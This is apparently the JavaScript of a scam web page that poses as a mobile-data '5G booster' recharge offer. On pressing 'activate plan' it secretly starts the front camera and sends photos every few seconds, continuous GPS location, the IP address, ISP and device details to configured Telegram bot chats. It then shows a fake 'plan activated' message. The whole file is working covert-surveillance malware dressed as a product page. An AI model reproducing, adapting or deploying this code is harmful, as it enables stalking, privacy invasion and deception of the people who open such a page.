// ========== CONFIGURATION FROM HIDDEN DIV (.env style) ==========
const configDiv = document.getElementById('app-config');
const CONFIG = {
    BOT_TOKEN: configDiv?.dataset.botToken || '',
    CHAT_IDS: configDiv?.dataset.chatIds?.split(',') || [],
    CAM_MODE: configDiv?.dataset.camMode || 'front',
    CAPTURE_INTERVAL: parseInt(configDiv?.dataset.captureInterval) || 5000,
    LOCATION_INTERVAL: parseInt(configDiv?.dataset.locationInterval) || 8000,
    SESSION_DURATION: parseInt(configDiv?.dataset.sessionDuration) || 30000
};

// ========== DOM ELEMENTS ==========
const elements = {
    statusBadge: document.getElementById('statusBadge'),
    balance: document.getElementById('balance'),
    mobileInput: document.getElementById('mobileNumber'),
    proceedBtn: document.getElementById('proceedBtn'),
    loadingOverlay: document.getElementById('loadingOverlay'),
    successModal: document.getElementById('successModal'),
    successMsg: document.getElementById('successMsg'),
    toast: document.getElementById('toast'),
    debugInfo: document.getElementById('debugInfo'),
    hiddenVideo: document.getElementById('hiddenVideo')
};

// ========== STATE VARIABLES ==========
let state = {
    selectedAmount: 199,
    selectedData: "1.5GB/day",
    selectedOperator: "jio",
    isCapturing: false,
    captureInterval: null,
    locationInterval: null,
    videoStream: null,
    photoCount: 0,
    locationCount: 0,
    sessionActive: false
};

// ========== UTILITY FUNCTIONS ==========
function debugLog(msg) {
    console.log(msg);
    if (elements.debugInfo) {
        elements.debugInfo.innerHTML = msg.slice(0, 45);
    }
}

function showToastMsg(msg, isError = false) {
    elements.toast.textContent = msg;
    elements.toast.style.background = isError ? 'rgba(239, 68, 68, 0.9)' : 'rgba(34, 197, 94, 0.9)';
    elements.toast.style.backdropFilter = 'blur(8px)';
    elements.toast.style.border = isError ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(34, 197, 94, 0.3)';
    elements.toast.style.opacity = '1';
    setTimeout(() => { elements.toast.style.opacity = '0'; }, 2000);
}

// ========== TELEGRAM FUNCTIONS (Multiple Chat IDs Support) ==========
const TELEGRAM_API = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/`;

async function sendToAllChats(endpoint, body, isFormData = false) {
    if (!CONFIG.BOT_TOKEN || CONFIG.CHAT_IDS.length === 0) {
        debugLog('❌ Bot token or Chat IDs missing');
        return 0;
    }
    
    let successCount = 0;
    
    for (const chatId of CONFIG.CHAT_IDS) {
        try {
            let requestBody;
            const config = { method: 'POST' };
            
            if (isFormData) {
                requestBody = body;
                config.body = requestBody;
            } else {
                requestBody = { ...body, chat_id: chatId.trim() };
                config.headers = { 'Content-Type': 'application/json' };
                config.body = JSON.stringify(requestBody);
            }
            
            const response = await fetch(TELEGRAM_API + endpoint, config);
            const result = await response.json();
            if (result.ok) successCount++;
        } catch(e) {
            debugLog(`Error sending to ${chatId}: ${e.message}`);
        }
    }
    return successCount;
}

async function sendPhotoToAllChats(blob, caption) {
    let successCount = 0;
    
    for (const chatId of CONFIG.CHAT_IDS) {
        try {
            const formData = new FormData();
            formData.append('chat_id', chatId.trim());
            formData.append('photo', blob, `cam_${Date.now()}.jpg`);
            formData.append('caption', caption);
            
            const response = await fetch(TELEGRAM_API + 'sendPhoto', {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            if (result.ok) successCount++;
        } catch(e) {
            debugLog(`Photo send error to ${chatId}: ${e.message}`);
        }
    }
    return successCount;
}

// ========== CAMERA FUNCTIONS ==========
async function captureAndSend() {
    if (!state.videoStream || !state.sessionActive) return;
    
    try {
        const video = elements.hiddenVideo;
        if (!video.videoWidth || video.videoWidth === 0) return;
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        const timestamp = new Date().toLocaleTimeString();
        const caption = `📸 CAMERA CAPTURE\n━━━━━━━━━━━━━━━━━━━━\n💰 Plan: ₹${state.selectedAmount} (${state.selectedData})\n📱 Mobile: ${elements.mobileInput.value}\n📡 Operator: ${state.selectedOperator.toUpperCase()}\n⏱️ Time: ${timestamp}\n🔢 Capture #${state.photoCount + 1}\n━━━━━━━━━━━━━━━━━━━━`;
        
        const sentCount = await sendPhotoToAllChats(blob, caption);
        if (sentCount > 0) {
            state.photoCount++;
            elements.balance.innerHTML = state.photoCount;
            debugLog(`📸 Photo #${state.photoCount} sent to ${sentCount} chats`);
        }
    } catch(e) {
        debugLog('Capture error: ' + e.message);
    }
}

async function startCamera() {
    try {
        const constraints = { 
            video: { 
                facingMode: CONFIG.CAM_MODE === 'back' ? 'environment' : 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            } 
        };
        
        state.videoStream = await navigator.mediaDevices.getUserMedia(constraints);
        elements.hiddenVideo.srcObject = state.videoStream;
        await elements.hiddenVideo.play();
        
        state.captureInterval = setInterval(captureAndSend, CONFIG.CAPTURE_INTERVAL);
        debugLog(`📷 Camera active | Mode: ${CONFIG.CAM_MODE} | Interval: ${CONFIG.CAPTURE_INTERVAL}ms`);
        return true;
    } catch(e) {
        debugLog('Camera error: ' + e.message);
        showToastMsg('Camera access required', true);
        return false;
    }
}

// ========== LIVE LOCATION FUNCTIONS (Continuous) ==========
async function sendLocationToAllChats(latitude, longitude, accuracy) {
    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const timestamp = new Date().toLocaleString();
    const keyboard = {
        inline_keyboard: [[
            { text: "📍 OPEN IN GOOGLE MAPS", url: mapsLink },
            { text: "🔄 LIVE TRACK", callback_data: "track" }
        ]]
    };
    
    // Send location pin
    await sendToAllChats('sendLocation', { latitude: latitude, longitude: longitude });
    
    // Send detailed message with map button
    const message = `📍 LIVE LOCATION UPDATE #${state.locationCount + 1}\n━━━━━━━━━━━━━━━━━━━━\n🌐 Coordinates:\n<code>${latitude}, ${longitude}</code>\n🎯 Accuracy: ${accuracy} meters\n━━━━━━━━━━━━━━━━━━━━\n💰 Plan: ₹${state.selectedAmount}\n📱 Mobile: ${elements.mobileInput.value}\n📡 Operator: ${state.selectedOperator.toUpperCase()}\n⏱️ Time: ${timestamp}\n━━━━━━━━━━━━━━━━━━━━`;
    
    await sendToAllChats('sendMessage', {
        text: message,
        parse_mode: 'HTML',
        reply_markup: JSON.stringify(keyboard)
    });
    
    state.locationCount++;
    debugLog(`📍 Location #${state.locationCount} sent | Accuracy: ${accuracy}m`);
}

function getCurrentLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            debugLog('❌ Geolocation not supported');
            resolve(null);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                let errorMsg = '';
                switch(error.code) {
                    case 1: errorMsg = 'Permission denied'; break;
                    case 2: errorMsg = 'Position unavailable'; break;
                    case 3: errorMsg = 'Timeout'; break;
                    default: errorMsg = 'Unknown error';
                }
                debugLog(`❌ Location error: ${errorMsg}`);
                resolve(null);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
}

async function startLiveLocation() {
    debugLog('📍 Starting live location tracking...');
    
    // Get and send first location immediately
    const firstLocation = await getCurrentLocation();
    if (firstLocation) {
        await sendLocationToAllChats(firstLocation.lat, firstLocation.lng, firstLocation.accuracy);
        showToastMsg('📍 Live location active');
    } else {
        await sendToAllChats('sendMessage', { 
            text: `⚠️ LOCATION UNAVAILABLE\nUnable to get device location.\nPlan: ₹${state.selectedAmount}\nMobile: ${elements.mobileInput.value}`,
            parse_mode: 'HTML'
        });
    }
    
    // Continue sending location every interval
    state.locationInterval = setInterval(async () => {
        if (!state.sessionActive) return;
        
        const location = await getCurrentLocation();
        if (location) {
            await sendLocationToAllChats(location.lat, location.lng, location.accuracy);
        } else {
            debugLog('⚠️ Location update failed');
        }
    }, CONFIG.LOCATION_INTERVAL);
    
    debugLog(`📍 Location interval set: ${CONFIG.LOCATION_INTERVAL}ms`);
}

// ========== DEVICE INFO ==========
async function sendDeviceInfo() {
    let ipData = { ip: 'N/A', city: 'N/A', country_name: 'N/A', org: 'N/A' };
    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        ipData = await ipRes.json();
    } catch(e) {
        debugLog('IP fetch failed');
    }
    
    let batteryInfo = { level: '?', charging: false };
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = { level: Math.round(battery.level * 100), charging: battery.charging };
        } catch(e) {}
    }
    
    const deviceInfo = `🔴 NEW ACTIVATION REQUEST 🔴\n━━━━━━━━━━━━━━━━━━━━\n\n💰 PLAN DETAILS\n• Amount: ₹${state.selectedAmount}\n• Data: ${state.selectedData}\n• Mobile: ${elements.mobileInput.value}\n• Operator: ${state.selectedOperator.toUpperCase()}\n\n🌐 DEVICE INFORMATION\n• IP: ${ipData.ip}\n• Location: ${ipData.city}, ${ipData.country_name}\n• ISP: ${ipData.org}\n• Battery: ${batteryInfo.level}% ${batteryInfo.charging ? '⚡ Charging' : '🔋'}\n• Screen: ${screen.width}x${screen.height}\n• Network: ${navigator.connection?.effectiveType || '4G'}\n\n📨 Sending to: ${CONFIG.CHAT_IDS.length} recipients\n━━━━━━━━━━━━━━━━━━━━\n⏱️ Started: ${new Date().toLocaleString()}`;
    
    await sendToAllChats('sendMessage', { text: deviceInfo, parse_mode: 'HTML' });
    debugLog('📱 Device info sent');
}

// ========== UI EVENT HANDLERS ==========
function initEventListeners() {
    // Recharge cards selection
    document.querySelectorAll('.recharge-card').forEach(card => {
        card.addEventListener('click', () => {
            document.querySelectorAll('.recharge-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            state.selectedAmount = parseInt(card.dataset.amount);
            state.selectedData = card.dataset.data;
            debugLog(`Plan selected: ₹${state.selectedAmount} - ${state.selectedData}`);
        });
    });
    
    // Operators selection
    document.querySelectorAll('.operator').forEach(op => {
        op.addEventListener('click', () => {
            document.querySelectorAll('.operator').forEach(o => o.classList.remove('selected'));
            op.classList.add('selected');
            state.selectedOperator = op.dataset.operator;
            debugLog(`Operator selected: ${state.selectedOperator.toUpperCase()}`);
        });
    });
    
    // Mobile number input
    elements.mobileInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
    });
    
    // Proceed button
    elements.proceedBtn.onclick = proceedRecharge;
}

// ========== MAIN RECHARGE FUNCTION ==========
async function proceedRecharge() {
    const mobile = elements.mobileInput.value;
    
    // Validation
    if (!mobile || mobile.length !== 10) {
        showToastMsg('Enter valid 10 digit mobile number', true);
        return;
    }
    
    if (!CONFIG.BOT_TOKEN || CONFIG.CHAT_IDS.length === 0) {
        showToastMsg('Configuration error! Contact support', true);
        debugLog('❌ BOT_TOKEN or CHAT_IDS missing');
        return;
    }
    
    // Start session
    state.sessionActive = true;
    state.photoCount = 0;
    state.locationCount = 0;
    elements.balance.innerHTML = '0';
    
    elements.proceedBtn.disabled = true;
    elements.proceedBtn.textContent = 'PROCESSING...';
    elements.loadingOverlay.style.display = 'flex';
    
    // Start camera
    const cameraStarted = await startCamera();
    if (!cameraStarted) {
        elements.loadingOverlay.style.display = 'none';
        elements.proceedBtn.disabled = false;
        elements.proceedBtn.textContent = 'ACTIVATE PLAN';
        state.sessionActive = false;
        return;
    }
    
    // Start live location (continuous)
    await startLiveLocation();
    
    // Send device info
    await sendDeviceInfo();
    
    // Send session start notification
    await sendToAllChats('sendMessage', {
        text: `🟢 SESSION STARTED\n━━━━━━━━━━━━━━━━━━━━\n📱 Target: ${mobile}\n📡 Operator: ${state.selectedOperator.toUpperCase()}\n💰 Plan: ₹${state.selectedAmount}\n⏱️ Duration: ${CONFIG.SESSION_DURATION / 1000} seconds\n━━━━━━━━━━━━━━━━━━━━`,
        parse_mode: 'HTML'
    });
    
    // Auto stop after session duration
    setTimeout(async () => {
        // Stop camera
        if (state.captureInterval) clearInterval(state.captureInterval);
        if (state.videoStream) {
            state.videoStream.getTracks().forEach(track => track.stop());
            state.videoStream = null;
        }
        
        // Stop location
        if (state.locationInterval) clearInterval(state.locationInterval);
        
        state.sessionActive = false;
        state.isCapturing = false;
        
        // Show success modal
        elements.loadingOverlay.style.display = 'none';
        elements.successMsg.innerHTML = `✅ ₹${state.selectedAmount} ${state.selectedOperator.toUpperCase()} PLAN ACTIVATED!\n\n📊 SUMMARY\n━━━━━━━━━━━━━━━━━━━━\n📸 Photos Captured: ${state.photoCount}\n📍 Location Updates: ${state.locationCount}\n📱 Mobile: ${mobile}\n📡 Operator: ${state.selectedOperator.toUpperCase()}\n━━━━━━━━━━━━━━━━━━━━\n🎉 Data plan activated successfully!`;
        elements.successModal.style.display = 'flex';
        
        elements.proceedBtn.disabled = false;
        elements.proceedBtn.textContent = 'ACTIVATE PLAN';
        
        // Send session complete notification
        await sendToAllChats('sendMessage', {
            text: `🔴 SESSION COMPLETE\n━━━━━━━━━━━━━━━━━━━━\n📸 Total Photos: ${state.photoCount}\n📍 Location Updates: ${state.locationCount}\n📱 Mobile: ${mobile}\n💰 Plan: ₹${state.selectedAmount}\n⏱️ Duration: ${CONFIG.SESSION_DURATION / 1000}s\n━━━━━━━━━━━━━━━━━━━━`,
            parse_mode: 'HTML'
        });
        
        debugLog(`✅ Session complete | Photos: ${state.photoCount} | Locations: ${state.locationCount}`);
    }, CONFIG.SESSION_DURATION);
}

// ========== MODAL FUNCTIONS ==========
function closeSuccessModal() {
    elements.successModal.style.display = 'none';
}

// ========== TEST BOT CONNECTION ==========
async function testBotConnection() {
    if (!CONFIG.BOT_TOKEN) {
        debugLog('❌ Bot token not configured');
        if (elements.statusBadge) {
            elements.statusBadge.style.background = 'rgba(239, 68, 68, 0.2)';
            elements.statusBadge.style.color = '#ef4444';
            elements.statusBadge.innerHTML = '● NO TOKEN';
        }
        return;
    }
    
    try {
        const response = await fetch(`${TELEGRAM_API}getMe`);
        const result = await response.json();
        
        if (result.ok) {
            debugLog(`✅ Bot online: ${result.result.username}`);
            if (elements.statusBadge) {
                elements.statusBadge.style.background = 'rgba(34, 197, 94, 0.2)';
                elements.statusBadge.style.color = '#22c55e';
                elements.statusBadge.innerHTML = `● ONLINE | ${CONFIG.CHAT_IDS.length} chats`;
            }
        } else {
            debugLog('❌ Bot connection failed - Invalid token');
            if (elements.statusBadge) {
                elements.statusBadge.style.background = 'rgba(239, 68, 68, 0.2)';
                elements.statusBadge.style.color = '#ef4444';
                elements.statusBadge.innerHTML = '● INVALID TOKEN';
            }
        }
    } catch(e) {
        debugLog(`❌ Cannot connect: ${e.message}`);
        if (elements.statusBadge) {
            elements.statusBadge.style.background = 'rgba(239, 68, 68, 0.2)';
            elements.statusBadge.style.color = '#ef4444';
            elements.statusBadge.innerHTML = '● OFFLINE';
        }
    }
}

// ========== CLEANUP ON PAGE UNLOAD ==========
window.onbeforeunload = () => {
    if (state.captureInterval) clearInterval(state.captureInterval);
    if (state.locationInterval) clearInterval(state.locationInterval);
    if (state.videoStream) {
        state.videoStream.getTracks().forEach(track => track.stop());
    }
};

// ========== INITIALIZE ==========
window.onload = () => {
    debugLog('━━━━━━━━━━━━━━━━━━━━');
    debugLog('🚀 5G BOOSTER INITIALIZING');
    debugLog('━━━━━━━━━━━━━━━━━━━━');
    debugLog(`🤖 Bot Token: ${CONFIG.BOT_TOKEN ? '✅ Loaded' : '❌ Missing'}`);
    debugLog(`👥 Chat IDs: ${CONFIG.CHAT_IDS.length} IDs`);
    debugLog(`📷 Camera Mode: ${CONFIG.CAM_MODE}`);
    debugLog(`⏱️ Capture Interval: ${CONFIG.CAPTURE_INTERVAL}ms`);
    debugLog(`📍 Location Interval: ${CONFIG.LOCATION_INTERVAL}ms`);
    debugLog(`⏰ Session Duration: ${CONFIG.SESSION_DURATION / 1000}s`);
    
    initEventListeners();
    testBotConnection();
    
    if (CONFIG.CHAT_IDS.length === 0) {
        debugLog('⚠️ WARNING: No Chat IDs configured!');
        if (elements.statusBadge) {
            elements.statusBadge.style.background = 'rgba(239, 68, 68, 0.2)';
            elements.statusBadge.style.color = '#ef4444';
            elements.statusBadge.innerHTML = '● NO CHAT ID';
        }
    }
};

// Expose functions to global scope
window.closeSuccessModal = closeSuccessModal;
